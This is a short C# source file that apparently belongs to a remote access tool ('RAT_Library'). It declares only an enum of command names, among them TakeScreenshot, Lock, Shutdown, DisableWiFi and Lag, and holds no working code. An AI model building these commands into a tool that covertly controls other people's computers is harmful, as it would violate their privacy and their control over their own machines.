namespace RAT_Library
{
    public enum RatCommand
    {
        CloseActiveWindow,
        ShowMessageBox,
        TakeScreenshot,
        Lock,
        Shutdown,
        SendMessage,
        PlaySound,
        Mute,
        DisableWiFi,
        Lag
    }
}
